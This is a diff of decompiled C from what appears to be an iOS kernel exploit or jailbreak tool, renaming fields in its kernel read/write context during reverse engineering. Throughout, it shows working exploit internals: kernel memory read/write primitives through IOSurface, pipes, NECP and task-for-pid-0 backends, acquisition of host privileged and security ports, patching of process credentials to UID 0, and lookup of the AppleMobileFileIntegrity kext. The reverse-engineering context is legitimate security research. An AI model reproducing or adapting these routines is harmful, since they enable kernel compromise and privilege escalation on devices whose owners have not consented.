@@ -28532,7 +28526,7 @@ bool __fastcall noppl_kwrite32(struct_krwCtx *krwCtx, mach_vm_address_t address,
   vm_machine_attribute_val_t value; // [xsp+Ch] [xbp-24h] BYREF
 
   v10 = a3;
-  v5 = (__int64 (__fastcall *)(__int64, mach_vm_address_t, int *, __int64, __int64))krwCtx->gap_0x40;
+  v5 = (__int64 (__fastcall *)(__int64, mach_vm_address_t, int *, __int64, __int64))krwCtx->iogpuKwriteFn;
   if ( v5 )
   {
     v6 = v5(krwCtx, address, &v10, 4, 1);
@@ -28550,16 +28544,16 @@ bool __fastcall noppl_kwrite32(struct_krwCtx *krwCtx, mach_vm_address_t address,
   {
     if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
       goto LABEL_22;
-    if ( krwCtx->gap_0x1940_size4 != -1 && krwCtx->gap_0x218 )
+    if ( krwCtx->iosurfaceFd_size4 != -1 && krwCtx->gap_0x218 )
     {
       v6 = necp_ioconnect_krw(krwCtx, address, (__int64)&v10, 4u, 1);
       goto LABEL_3;
     }
-    if ( krwCtx->gap_0x1938 == -1 || krwCtx->gap_0x193C == -1 )
+    if ( krwCtx->pipeFd0 == -1 || krwCtx->pipeFd1 == -1 )
     {
 LABEL_22:
-      v7 = mach_vm_write(krwCtx->gap_0x1918_size4, address, (vm_offset_t)&v10, 4u);
-      v9 = krwCtx->gap_0x1918_size4;
+      v7 = mach_vm_write(krwCtx->targetVmPort, address, (vm_offset_t)&v10, 4u);
+      v9 = krwCtx->targetVmPort;
       value = 7;
       mach_vm_machine_attribute(v9, address, 4u, 1u, &value);
       return v7 == 0;
@@ -29015,7 +29009,7 @@ bool __fastcall kread_u32(struct_krwCtx *krwCtx, unsigned __int64 vaddr, void *o
   __int64 v7; // [xsp+8h] [xbp-8h] BYREF
 
   krwCtx = KRWCTX_FROM_UINTPTR(krwCtx);
-  v3 = (__int64 (__fastcall *)(__int64, unsigned __int64, void *, unsigned int, __int64))krwCtx->gap_0x30;
+  v3 = (__int64 (__fastcall *)(__int64, unsigned __int64, void *, unsigned int, __int64))krwCtx->iogpuKreadFn;
   if ( v3 )
   {
     v4 = v3(krwCtx, vaddr, outBuf, 4, 1);
@@ -29033,16 +29027,16 @@ bool __fastcall kread_u32(struct_krwCtx *krwCtx, unsigned __int64 vaddr, void *o
   {
     if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
       goto LABEL_22;
-    if ( krwCtx->gap_0x1940 != -1 && krwCtx->gap_0x218 )
+    if ( krwCtx->iosurfaceFd != -1 && krwCtx->gap_0x218 )
     {
       v4 = kreadbuf_via_dev_null_only(krwCtx, vaddr, (__int64)outBuf, 4u, 1);
       goto LABEL_3;
     }
-    if ( krwCtx->gap_0x1938 == -1 || krwCtx->gap_0x193C == -1 )
+    if ( krwCtx->pipeFd0 == -1 || krwCtx->pipeFd1 == -1 )
     {
 LABEL_22:
       v5 = kreadbuf_via_tfp0(
-             krwCtx->gap_0x1918_size4,
+             krwCtx->targetVmPort,
              vaddr,
              4u,
              krwCtx->gap_0x178,
@@ -29349,7 +29343,7 @@ bool __fastcall kread64_internal(struct_krwCtx *krwCtx, unsigned __int64 a2, uin
   __int64 v7; // [xsp+8h] [xbp-8h] BYREF
 
   *a3 = 0;
-  v3 = *(__int64 (__fastcall **)(struct_krwCtx *, unsigned __int64, uint64_t *, uint64_t, __int64))&krwCtx->gap_0x30;
+  v3 = *(__int64 (__fastcall **)(struct_krwCtx *, unsigned __int64, uint64_t *, uint64_t, __int64))&krwCtx->iogpuKreadFn;
   if ( v3 )
   {
     v4 = v3(krwCtx, a2, a3, (unsigned int)krwCtx->stride_0x168, 1);
@@ -29367,15 +29361,15 @@ bool __fastcall kread64_internal(struct_krwCtx *krwCtx, unsigned __int64 a2, uin
   {
     if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
       goto LABEL_22;
-    if ( krwCtx->gap_0x1940 != -1 && krwCtx->gap_0x218 )
+    if ( krwCtx->iosurfaceFd != -1 && krwCtx->gap_0x218 )
     {
       v4 = kreadbuf_via_dev_null_only(krwCtx, a2, (__int64)a3, krwCtx->stride_0x168, 1);
       goto LABEL_3;
     }
-    if ( krwCtx->gap_0x1938 == -1 || krwCtx->gap_0x193C == -1 )
+    if ( krwCtx->pipeFd0 == -1 || krwCtx->pipeFd1 == -1 )
     {
 LABEL_22:
-      v5 = kreadbuf_via_tfp0(krwCtx->gap_0x1918, a2, krwCtx->stride_0x168, (unsigned int)krwCtx->gap_0x178, (__int64)a3, &v7);
+      v5 = kreadbuf_via_tfp0(krwCtx->targetAndParentTaskPorts, a2, krwCtx->stride_0x168, (unsigned int)krwCtx->gap_0x178, (__int64)a3, &v7);
       return v5 == 0;
     }
     v4 = kreadbuf_via_dev_null_simple(krwCtx, a2, a3, krwCtx->stride_0x168, 1);
@@ -29449,7 +29443,7 @@ bool __fastcall this_is_the_kwrite64(struct_krwCtx *krwCtx, mach_vm_address_t ad
   vm_machine_attribute_val_t value[2]; // [xsp+18h] [xbp-38h] BYREF
 
   v22 = newValue;
-  v6 = (__int64 (__fastcall *)(__int64, mach_vm_address_t, __int64 *, uint64_t, __int64))krwCtx->gap_0x40;
+  v6 = (__int64 (__fastcall *)(__int64, mach_vm_address_t, __int64 *, uint64_t, __int64))krwCtx->iogpuKwriteFn;
   if ( v6 )
   {
     v7 = v6(krwCtx, address, &v22, krwCtx->stride_0x168, 1);
@@ -29473,16 +29467,16 @@ bool __fastcall this_is_the_kwrite64(struct_krwCtx *krwCtx, mach_vm_address_t ad
   }
   if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
     goto LABEL_27;
-  if ( krwCtx->gap_0x1940_size4 == -1 || !krwCtx->gap_0x218 )
+  if ( krwCtx->iosurfaceFd_size4 == -1 || !krwCtx->gap_0x218 )
   {
-    if ( krwCtx->gap_0x1938 != -1 && krwCtx->gap_0x193C != -1 )
+    if ( krwCtx->pipeFd0 != -1 && krwCtx->pipeFd1 != -1 )
     {
       v7 = pipe_pair_krw(krwCtx, address, &v22, krwCtx->stride_0x168, 1);
       goto LABEL_3;
     }
 LABEL_27:
-    v8 = mach_vm_write(krwCtx->gap_0x1918_size4, address, (vm_offset_t)&v22, krwCtx->stride_0x168);
-    v13 = krwCtx->gap_0x1918_size4;
+    v8 = mach_vm_write(krwCtx->targetVmPort, address, (vm_offset_t)&v22, krwCtx->stride_0x168);
+    v13 = krwCtx->targetVmPort;
     v14 = krwCtx->stride_0x168;
     value[0] = 7;
     mach_vm_machine_attribute(v13, address, v14, 1u, value);
@@ -29540,9 +29534,9 @@ LABEL_41:
       teardown_semaphore_helper_ctx(krwCtx, 0);
     }
 LABEL_32:
-    v16 = krwCtx->gap_0x118;
+    v16 = krwCtx->mappedKernelRegion;
     v17 = 708616;
-    if ( v16 && krwCtx->gap_0x120 )
+    if ( v16 && krwCtx->mappedKernelSize )
     {
       v17 = 0;
       atomic_store(0, (unsigned __int8 *)(v16 + 1));
@@ -29736,7 +29730,7 @@ bool __fastcall kreadbuf_universal(struct_krwCtx *krwCtx, unsigned __int64 vaddr
   int v6; // w0
   int v7; // w0
 
-  v5 = *(__int64 (__fastcall **)(struct_krwCtx *, unsigned __int64, void *, mach_vm_size_t, __int64))&krwCtx->gap_0x30;
+  v5 = *(__int64 (__fastcall **)(struct_krwCtx *, unsigned __int64, void *, mach_vm_size_t, __int64))&krwCtx->iogpuKreadFn;
   if ( v5 )
   {
     v6 = v5(krwCtx, vaddr, outBuf, size, a5);
@@ -29756,15 +29750,15 @@ bool __fastcall kreadbuf_universal(struct_krwCtx *krwCtx, unsigned __int64 vaddr
   {
     if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
       goto LABEL_22;
-    if ( krwCtx->gap_0x1940 != -1 && krwCtx->gap_0x218 )
+    if ( krwCtx->iosurfaceFd != -1 && krwCtx->gap_0x218 )
     {
       v6 = kreadbuf_via_dev_null_only(krwCtx, vaddr, (__int64)outBuf, size, a5);
       goto LABEL_3;
     }
-    if ( krwCtx->gap_0x1938 == -1 || krwCtx->gap_0x193C == -1 )
+    if ( krwCtx->pipeFd0 == -1 || krwCtx->pipeFd1 == -1 )
     {
 LABEL_22:
-      v7 = kreadbuf_via_tfp0(krwCtx->gap_0x1918, vaddr, size, (unsigned int)krwCtx->gap_0x178, (__int64)outBuf, 0);
+      v7 = kreadbuf_via_tfp0(krwCtx->targetAndParentTaskPorts, vaddr, size, (unsigned int)krwCtx->gap_0x178, (__int64)outBuf, 0);
       return v7 == 0;
     }
     v6 = kreadbuf_via_dev_null_simple(krwCtx, vaddr, outBuf, size, a5);
@@ -29797,7 +29791,7 @@ bool __fastcall noppl_kwritebuf(struct_krwCtx *krwCtx, unsigned __int64 a2, cons
               (unsigned long long)a3,
               (unsigned long long)a4,
               a5,
-              (unsigned long long)krwCtx->gap_0x40,
+              (unsigned long long)krwCtx->iogpuKwriteFn,
               krwCtx->threadForKernelRead,
               (unsigned long long)krwCtx->gap_0xD8,
               krwCtx->gap_0xE8,
@@ -29805,13 +29799,13 @@ bool __fastcall noppl_kwritebuf(struct_krwCtx *krwCtx, unsigned __int64 a2, cons
               (unsigned long long)krwCtx->gap_0x100,
               krwCtx->krw_pipe_0,
               krwCtx->krw_pipe_1,
-              krwCtx->gap_0x1938,
-              krwCtx->gap_0x193C,
-              krwCtx->gap_0x1940_size4,
+              krwCtx->pipeFd0,
+              krwCtx->pipeFd1,
+              krwCtx->iosurfaceFd_size4,
               (unsigned long long)krwCtx->gap_0x218,
-              krwCtx->gap_0x1918_size4,
+              krwCtx->targetVmPort,
               krwCtx->gap_0x178_size4);
-  v5 = (__int64 (__fastcall *)(__int64, unsigned __int64, const void *, mach_vm_size_t, int))krwCtx->gap_0x40;
+  v5 = (__int64 (__fastcall *)(__int64, unsigned __int64, const void *, mach_vm_size_t, int))krwCtx->iogpuKwriteFn;
   if ( v5 )
   {
     v6 = v5(krwCtx, a2, a3, a4, a5);
@@ -29832,16 +29826,16 @@ bool __fastcall noppl_kwritebuf(struct_krwCtx *krwCtx, unsigned __int64 a2, cons
   {
     if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
       goto LABEL_22;
-    if ( krwCtx->gap_0x1940_size4 != -1 && krwCtx->gap_0x218 )
+    if ( krwCtx->iosurfaceFd_size4 != -1 && krwCtx->gap_0x218 )
     {
       v6 = necp_ioconnect_krw(krwCtx, a2, (__int64)a3, a4, a5);
       TRACE_PORTS("noppl_kwritebuf backend=necp raw=%x\n", v6);
       goto LABEL_3;
     }
-    if ( krwCtx->gap_0x1938 == -1 || krwCtx->gap_0x193C == -1 )
+    if ( krwCtx->pipeFd0 == -1 || krwCtx->pipeFd1 == -1 )
     {
 LABEL_22:
-      v7 = mach_vm_read_with_attr_chunks(krwCtx->gap_0x1918_size4, a2, (__int64)a3, a4, krwCtx->gap_0x178_size4);
+      v7 = mach_vm_read_with_attr_chunks(krwCtx->targetVmPort, a2, (__int64)a3, a4, krwCtx->gap_0x178_size4);
       TRACE_PORTS("noppl_kwritebuf backend=tfp raw=%x ok=%d\n", v7, v7 == 0);
       return v7 == 0;
     }
@@ -33611,7 +33605,7 @@ LABEL_47:
                   free(v27);
                   if ( !v55 )
                     return 1;
-                  return mach_vm_wire(krwCtx->gap_0x1920_size4, a2, a3, a4, desired_access) == 0;
+                  return mach_vm_wire(krwCtx->hostPrivPort, a2, a3, a4, desired_access) == 0;
                 }
               }
             }
@@ -36715,12 +36709,12 @@ unsigned __int64 __fastcall lookup_or_resolve_kaddr(struct_krwCtx *krwCtx)
   v3 = krwCtx->gap_0x19D0_size8;
   if ( v3 )
     return maybe_ipc_port_get_kobject(krwCtx, v3);
-  v4 = krwCtx->gap_0x191C_size4;
+  v4 = krwCtx->parentTaskPort;
   if ( v4 == -1 )
     return 0;
   if ( !v4 )
   {
-    v4 = krwCtx->gap_0x1918_size4;
+    v4 = krwCtx->targetVmPort;
     if ( v4 + 1 < 2 )
       return 0;
   }
@@ -37283,7 +37277,7 @@ __int64 __fastcall setup_task_port_chain(struct_krwCtx *krwCtx, mach_port_name_t
   if ( !selfPortKobject )
     return 0;
 
-  if ( krwCtx->gap_0x1918_size4 + 1 <= 1 )
+  if ( krwCtx->targetVmPort + 1 <= 1 )
   {
     pid = 0;
     if ( pid_for_task(task, &pid) )
@@ -37295,7 +37289,7 @@ __int64 __fastcall setup_task_port_chain(struct_krwCtx *krwCtx, mach_port_name_t
   else
   {
     init_port_set = task;
-    if ( mach_ports_register(krwCtx->gap_0x1918_size4, &init_port_set, 1u) )
+    if ( mach_ports_register(krwCtx->targetVmPort, &init_port_set, 1u) )
       return 0;
 
     if ( krwCtx->xnuMajorVersion == 6153 )
@@ -37316,7 +37310,7 @@ __int64 __fastcall setup_task_port_chain(struct_krwCtx *krwCtx, mach_port_name_t
       return 0;
 
     init_port_set = 0;
-    if ( mach_ports_register(krwCtx->gap_0x1918_size4, &init_port_set, 1u) )
+    if ( mach_ports_register(krwCtx->targetVmPort, &init_port_set, 1u) )
       return 0;
   }
 
@@ -38594,7 +38588,7 @@ LABEL_17:
     v12 = 1204;
   }
 LABEL_43:
-  v22 = host_processors(krwCtx->gap_0x1920_size4, &out_processor_list, &out_processor_listCnt);
+  v22 = host_processors(krwCtx->hostPrivPort, &out_processor_list, &out_processor_listCnt);
   if ( v22 )
     return v22 | 0x80000000;
   v23 = out_processor_listCnt;
@@ -41620,7 +41614,7 @@ __int64 __fastcall read_via_mapped_physmem_region(struct_krwCtx *krwCtx, unsigne
   __int64 result; // x0
   uint64_t v10[7]; // [xsp+8h] [xbp-58h] BYREF
 
-  v9 = (__int64 (__fastcall *)(__int64, unsigned __int64, void *, unsigned int, int))krwCtx->gap_0x38;
+  v9 = (__int64 (__fastcall *)(__int64, unsigned __int64, void *, unsigned int, int))krwCtx->iogpuKread2Fn;
   if ( v9 )
   {
     return v9(krwCtx, a2, a3, a4, a5);
@@ -41651,7 +41645,7 @@ __int64 __fastcall physwritebuf_direct_mapped(
   __int64 result; // x0
   uint64_t v10[7]; // [xsp+8h] [xbp-58h] BYREF
 
-  v9 = *(__int64 (__fastcall **)(struct_krwCtx *, unsigned __int64, const void *, unsigned int, int))&krwCtx->gap_0x48;
+  v9 = *(__int64 (__fastcall **)(struct_krwCtx *, unsigned __int64, const void *, unsigned int, int))&krwCtx->iogpuKwrite2Fn;
   if ( v9 )
   {
     return v9(krwCtx, paddr, buf, size, something);
@@ -42285,8 +42279,8 @@ __int64 __fastcall init_pgtable_walk_ctx(struct_krwCtx *krwCtx, unsigned __int64
     return 708617;
   v6 = (__int64)v5;
   krw_ctx_zero_fields(v5, krwCtx);
-  v7 = *(__int128 *)((char *)krwCtx + 336);
-  *(__int128 *)(v6 + 112) = *(__int128 *)((char *)krwCtx + 320);
+  v7 = *(__int128 *)&krwCtx->gap_0x150;
+  *(__int128 *)(v6 + 112) = *(__int128 *)&krwCtx->xnuMajorVersion;
   *(__int128 *)(v6 + 128) = v7;
   *(uint64_t *)(v6 + 144) = krwCtx->gap_0x160_size8;
   *(uint32_t *)(v6 + 152) = krwCtx->gap_0x178_size4;
@@ -42569,9 +42563,9 @@ __int64 __fastcall create_pthread_something(struct_krwCtx *krwCtx, pthread_t *a2
       if ( v15 )
       {
         v16 = v15;
-        v17 = krwCtx->gap_0x191C_size4;
+        v17 = krwCtx->parentTaskPort;
         if ( !v17 )
-          v17 = krwCtx->gap_0x1918_size4;
+          v17 = krwCtx->targetVmPort;
         if ( kwrite_task_dispatch_via_kobj(krwCtx, v17, v15) )
         {
           v19 = thread_resume(v16);
@@ -42901,7 +42895,7 @@ unsigned __int64 __fastcall get_kernel_task_host_port(struct_krwCtx *krwCtx)
   } locals;
 
   v2 = mach_host_self();
-  result = krwCtx->gap_0x1920_size4;
+  result = krwCtx->hostPrivPort;
   if ( (unsigned int)(result + 1) <= 1 )
   {
     if ( !host_get_special_port(v2, -1, 2, &locals.port) )
@@ -42943,7 +42937,7 @@ unsigned __int64 __fastcall get_ioservice_conn_port(struct_krwCtx *krwCtx)
   unsigned __int64 result; // x0
   mach_port_name_t v3; // [xsp+Ch] [xbp-14h] BYREF
 
-  result = krwCtx->gap_0x1924_size4;
+  result = krwCtx->hostSecurityPort;
   if ( (unsigned int)(result + 1) <= 1 )
   {
     result = get_ipc_port_kaddr_via_host(krwCtx, 0);
@@ -43448,7 +43442,7 @@ LABEL_54:
   if ( !kread_physmap_decorated(krwCtx, v11 + krwCtx->stride_0x168, (unsigned __int64 *)&v47) )
     return 0;
   v46 = v47;
-  v12 = krwCtx->gap_0x1D30_size8;
+  v12 = krwCtx->kextMachoCtx1;
   if ( v12 )
   {
 LABEL_9:
@@ -43457,16 +43451,16 @@ LABEL_9:
     if ( v13 )
     {
       v14 = v13;
-      v15 = find_kernel_func(krwCtx->gap_0x1D30_size8, (__int64 *)(v13 - 8));
+      v15 = find_kernel_func(krwCtx->kextMachoCtx1, (__int64 *)(v13 - 8));
       if ( v15 )
       {
-        v16 = macho_read_u64_thunk(krwCtx->gap_0x1D30_size8, v15);
+        v16 = macho_read_u64_thunk(krwCtx->kextMachoCtx1, v15);
         if ( validate_kaddr_range(krwCtx, v16) )
         {
-          v17 = find_kernel_func(krwCtx->gap_0x1D30_size8, (__int64 *)(v14 + 4));
+          v17 = find_kernel_func(krwCtx->kextMachoCtx1, (__int64 *)(v14 + 4));
           if ( v17 )
           {
-              v18 = macho_read_u64_thunk(krwCtx->gap_0x1D30_size8, v17);
+              v18 = macho_read_u64_thunk(krwCtx->kextMachoCtx1, v17);
             if ( v18 )
             {
               v19 = v16 + (((unsigned __int64)(v46 - v18) >> 10) & 0x3FFFFFFFFFFFF0LL) + 9;
@@ -43520,15 +43514,15 @@ LABEL_9:
                   {
                     v12 = (__int64)v44;
                     krw_ctx_zero_fields(v44, krwCtx);
-                    v45 = *(__int128 *)((char *)krwCtx + 336);
-                    *(__int128 *)(v12 + 112) = *(__int128 *)((char *)krwCtx + 320);
+                    v45 = *(__int128 *)&krwCtx->gap_0x150;
+                    *(__int128 *)(v12 + 112) = *(__int128 *)&krwCtx->xnuMajorVersion;
                     *(__int128 *)(v12 + 128) = v45;
                     *(uint64_t *)(v12 + 144) = krwCtx->gap_0x160_size8;
                     *(uint32_t *)(v12 + 152) = krwCtx->gap_0x178_size4;
                     *(uint32_t *)(v12 + 56) = krwCtx->pageSizeOrSomething;
                     if ( iosurface_physmap_setup_bool(v12, 0, v42, 0) )
                     {
-                      krwCtx->gap_0x1D30_size8 = v12;
+                      krwCtx->kextMachoCtx1 = v12;
                       goto LABEL_9;
                     }
                   }
@@ -43795,7 +43789,7 @@ int set_task_special_port_and_patch_uid(struct_krwCtx *krwCtx, task_inspect_t ta
             int32_t  write_val2; // w2, used for ppl_kwrite32 of cred_addr
             bool     need_v13;   // w27
 
-            if (krwCtx->gap_0x1920_size4 == a3) {
+            if (krwCtx->hostPrivPort == a3) {
                 // Self task port slot
                 new_uid    = 0;
                 bool is_new_ver = krwCtx->xnuVersionPacked > ver_threshold_new;
@@ -43803,7 +43797,7 @@ int set_task_special_port_and_patch_uid(struct_krwCtx *krwCtx, task_inspect_t ta
                 need_v13   = is_new_ver && uid_is_zero;  // ands w27, w10, w11
                 write_val2 = need_v13 ? 501 : 0;         // csel w2, #501, wzr
             } else {
-                if (krwCtx->gap_0x1928 != a3)
+                if (krwCtx->hostSelfPort != a3)
                     return 0;
                 // Other port slot
                 new_uid    = cur_uid;    // mov x24, x9
@@ -43908,7 +43902,7 @@ int set_task_special_port_and_patch_uid(struct_krwCtx *krwCtx, task_inspect_t ta
             // Old path: version <= 8018
             // Use host_security_set_task_token
 
-            host_security_t host_sec = krwCtx->gap_0x1924_size4;
+            host_security_t host_sec = krwCtx->hostSecurityPort;
 
             uint32_t cnt = 2;
             integer_t task_info_out[2] = {0};
@@ -44003,9 +43997,9 @@ bool __fastcall real_task_for_pid_or_name(
 
   if ( victim_pid < 1 || getpid() != victim_pid )
   {
-    v11 = krwCtx->gap_0x191C_size4;
+    v11 = krwCtx->parentTaskPort;
     if ( !v11 )
-      v11 = krwCtx->gap_0x1918_size4;
+      v11 = krwCtx->targetVmPort;
     v12 = get_task_kobject_addr(krwCtx, v11);
     if ( !v12 )
       return 0;
@@ -44431,7 +44425,7 @@ __int64 __fastcall refresh_target_task_port(struct_krwCtx *krwCtx, unsigned int 
   }
   if ( krwCtx->krw_pipe_0 == -1
     || krwCtx->krw_pipe_1 == -1
-    || krwCtx->gap_0x1940_size4 == -1
+    || krwCtx->iosurfaceFd_size4 == -1
     || !krwCtx->gap_0x218 )
   {
     if ( !a3 )
@@ -44487,7 +44481,7 @@ LABEL_58:
   }
   if ( krwCtx->krw_pipe_0 == -1
     || krwCtx->krw_pipe_1 == -1
-    || krwCtx->gap_0x1940_size4 == -1
+    || krwCtx->iosurfaceFd_size4 == -1
     || !krwCtx->gap_0x218 )
   {
     if ( !a3 )
@@ -44722,7 +44716,6 @@ __int64 __fastcall driver_init2_1(struct_krwCtx *krwCtx, int something)
   int v34; // w0
   int v35; // w8
   int v36; // w9
-  uint64_t *gap_0x1948; // x26
   int v39; // w0
   unsigned __int64 v40; // x9
   unsigned __int64 v41; // x22
@@ -44795,8 +44788,8 @@ __int64 __fastcall driver_init2_1(struct_krwCtx *krwCtx, int something)
   v97 = 0;
   v96 = 0;
   krwCtx->krw_pipe_0 = -1;
-  *(uint64_t *)&krwCtx->gap_0x1938 = -1;
-  *(uint64_t *)&krwCtx->gap_0x1940 = -1;
+  *(uint64_t *)&krwCtx->pipeFd0 = -1;
+  *(uint64_t *)&krwCtx->iosurfaceFd = -1;
   mach_timebase_info(&krwCtx->timebase);
   pthread_mutex_init(&krwCtx->someMutex2, 0);
   pthread_mutex_init(&krwCtx->someMutex, 0);
@@ -45066,7 +45059,6 @@ LABEL_96:
   mach_port_with_a2 = create_mach_port_with_a2(krwCtx, 0x200u);
   if ( (uint32_t)mach_port_with_a2 )
     return mach_port_with_a2;
-  gap_0x1948 = (uint64_t *)krwCtx->krw_pipe_0;
   if ( something )
   {
     setupPath = krw_select_setup_path(krwCtx);
@@ -45085,7 +45077,7 @@ LABEL_96:
     v42 = 1152;
   if ( !krw_has_any_ready_method(krwCtx) )
   {
-    mach_port_with_a2 = kext_exploit_main_trampoline((uint64_t)krwCtx, krwCtx->gap_0x19D0, 0, (uint64_t)&krwCtx->gap_0x1918);
+    mach_port_with_a2 = kext_exploit_main_trampoline((uint64_t)krwCtx, krwCtx->gap_0x19D0, 0, (uint64_t)&krwCtx->targetAndParentTaskPorts);
     if ( (uint32_t)mach_port_with_a2 )
       return mach_port_with_a2;
   }
@@ -45111,7 +45103,7 @@ LABEL_172:
       return mach_port_with_a2;
     v43 = krwCtx->xnuVersionPacked;
   }
-  v93 = (mach_port_name_t *)&krwCtx->gap_0x1918 + 1;
+  v93 = (mach_port_name_t *)&krwCtx->targetAndParentTaskPorts + 1;
   if ( v43 <= XNU_VERSION_PACKED(8791, 1023, 1023, 1023, 1023) )
   {
     v47 = krwCtx->gap_0x19D0;
@@ -45132,7 +45124,7 @@ LABEL_172:
   }
   else
   {
-    HIDWORD(krwCtx->gap_0x1918) = -1;
+    HIDWORD(krwCtx->targetAndParentTaskPorts) = -1;
   }
   if ( (unsigned int)alloc_vm_page(krwCtx) )
   {
@@ -45143,10 +45135,10 @@ LABEL_172:
   v44 = krwCtx->machHeaderPlus0x8000;
   if ( !v44 )
   {
-    v45 = *(uint64_t *)&krwCtx->gap_0x118;
+    v45 = *(uint64_t *)&krwCtx->mappedKernelRegion;
     if ( v45 )
     {
-      if ( *(uint64_t *)&krwCtx->gap_0x120 )
+      if ( *(uint64_t *)&krwCtx->mappedKernelSize )
       {
         v44 = *(uint64_t *)(v45 + 312);
         if ( v44 )
@@ -45164,8 +45156,8 @@ LABEL_199:
       {
         v44 = krwCtx->slideMaybe + v46;
 LABEL_196:
-        v50 = *(uint64_t *)&krwCtx->gap_0x118;
-        if ( v50 && *(uint64_t *)&krwCtx->gap_0x120 )
+        v50 = *(uint64_t *)&krwCtx->mappedKernelRegion;
+        if ( v50 && *(uint64_t *)&krwCtx->mappedKernelSize )
           *(uint64_t *)(v50 + 312) = v44;
         goto LABEL_199;
       }
@@ -45213,7 +45205,7 @@ LABEL_211:
     *(uint64_t *)(v52 + 144) = xnuVersion.qword20;
     *(uint32_t *)(v52 + 152) = krwCtx->gap_0x178;
     *(uint32_t *)(v52 + 56) = krwCtx->pageSizeOrSomething;
-    if ( !iosurface_physmap_setup_alt(v52, krwCtx->gap_0x1918, v44, v42) )
+    if ( !iosurface_physmap_setup_alt(v52, krwCtx->targetAndParentTaskPorts, v44, v42) )
       return 163863;
     krwCtx->gap_0x19F8 = v52;
   }
@@ -45230,7 +45222,7 @@ LABEL_211:
   {
     v54 = *v93;
     if ( !*v93 )
-      v54 = krwCtx->gap_0x1918;
+      v54 = krwCtx->targetAndParentTaskPorts;
     v55 = find_kernel_struct_addr(krwCtx, v54);
     if ( v55 )
     {
@@ -45246,14 +45238,14 @@ LABEL_211:
   }
   v60 = *v93;
   if ( !*v93 )
-    v60 = krwCtx->gap_0x1918;
+    v60 = krwCtx->targetAndParentTaskPorts;
   if ( (unsigned int)get_task_memory_info(v60, &v104, &v103) )
     return 0x28012;
   krwCtx->gap_0x19E8 = *(uint64_t *)&v104.st_dev;
   v57 = v103;
 LABEL_233:
   krwCtx->gap_0x19F0 = v57;
-  if ( *(uint32_t *)gap_0x1948 == -1 || krwCtx->krw_pipe_1 == -1 || krwCtx->gap_0x1940 == -1 || !krwCtx->gap_0x218 )
+  if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 || krwCtx->iosurfaceFd == -1 || !krwCtx->gap_0x218 )
     goto LABEL_260;
   v61 = *(__int64 **)&krwCtx->gap_0x220;
   if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
@@ -45295,7 +45287,7 @@ LABEL_255:
     goto LABEL_255;
   *(__int64 **)&krwCtx->gap_0x220 = v61;
 LABEL_259:
-  *(uint64_t *)(*(uint64_t *)&krwCtx->gap_0x118 + 256LL) = v61;
+  *(uint64_t *)(*(uint64_t *)&krwCtx->mappedKernelRegion + 256LL) = v61;
 LABEL_260:
   if ( *(uint8_t *)(v52 + 156) )
     krw_ctx_set_flag(krwCtx, KRW_CTX_FLAG_HAS_AUXKC_INFO);
@@ -45343,10 +45335,10 @@ LABEL_267:
       BYTE1(v79->oword100) = 1;
       *((uint64_t *)&v79->owordA0 + 1) = v52;
     }
-    if ( !iosurface_physmap_setup_bool((__int64)v79, krwCtx->gap_0x1918, v98, v80) )
+    if ( !iosurface_physmap_setup_bool((__int64)v79, krwCtx->targetAndParentTaskPorts, v98, v80) )
       return 163863;
     LODWORD(v79->oword30) = *(uint32_t *)(v52 + 48);
-    krwCtx->gap_0x1D18_size8 = (uint64_t)v79;
+    krwCtx->sandboxMachoCtx = (uint64_t)v79;
     if ( !(unsigned int)get_kext_base_addr(krwCtx, "com.apple.driver.AppleMobileFileIntegrity", &v100) )
       return 163864;
     v82 = (struct_v83 *)calloc(0x128u, 1u);
@@ -45366,14 +45358,14 @@ LABEL_267:
       v83->byte101 = 1;
       v83->qwordA8 = v52;
     }
-    if ( !iosurface_physmap_setup_bool((__int64)v83, krwCtx->gap_0x1918, v100, v80) )
+    if ( !iosurface_physmap_setup_bool((__int64)v83, krwCtx->targetAndParentTaskPorts, v100, v80) )
       return 163863;
     v83->dword30 = *(uint32_t *)(v52 + 48);
-    krwCtx->gap_0x1D20_kern_addr_allows_security_research = (uint64_t)v83;
+    krwCtx->amfiMachoCtx = (uint64_t)v83;
   }
   *(uint64_t *)&v104.st_dev = 0;
-  v70 = *(uint64_t *)&krwCtx->gap_0x118;
-  if ( !v70 || !*(uint64_t *)&krwCtx->gap_0x120 || (v71 = *(uint64_t *)(v70 + 296), (*(uint64_t *)&v104.st_dev = v71) == 0) )
+  v70 = *(uint64_t *)&krwCtx->mappedKernelRegion;
+  if ( !v70 || !*(uint64_t *)&krwCtx->mappedKernelSize || (v71 = *(uint64_t *)(v70 + 296), (*(uint64_t *)&v104.st_dev = v71) == 0) )
   {
     v77 = find_kernel_gadget(krwCtx->gap_0x19F8);
     if ( !v77 )
@@ -45383,8 +45375,8 @@ LABEL_267:
     v71 = *(uint64_t *)&v104.st_dev;
     if ( (v104.st_dev & 1) == 0 )
       return 163866;
-    v85 = *(uint64_t *)&krwCtx->gap_0x118;
-    if ( v85 && *(uint64_t *)&krwCtx->gap_0x120 )
+    v85 = *(uint64_t *)&krwCtx->mappedKernelRegion;
+    if ( v85 && *(uint64_t *)&krwCtx->mappedKernelSize )
     {
       *(uint64_t *)(v85 + 296) = *(uint64_t *)&v104.st_dev;
       v71 = *(uint64_t *)&v104.st_dev;
@@ -45394,7 +45386,7 @@ LABEL_267:
   krw_ctx_clr_flag(krwCtx, 256);
   if ( krwCtx->krw_pipe_0 == -1
     || krwCtx->krw_pipe_1 == -1
-    || krwCtx->gap_0x1940 == -1
+    || krwCtx->iosurfaceFd == -1
     || !krwCtx->gap_0x218
     || (mach_port_with_a2 = setup_iosurface_semaphore_helper(krwCtx), !(uint32_t)mach_port_with_a2) )
   {
@@ -45411,7 +45403,7 @@ LABEL_267:
           goto LABEL_280;
         if ( (unsigned int)check_dispatch_krw_state(krwCtx, 1) )
         {
-          v86 = krwCtx->gap_0x1D20_kern_addr_allows_security_research;
+          v86 = krwCtx->amfiMachoCtx;
           if ( !v86 )
             return 708609;
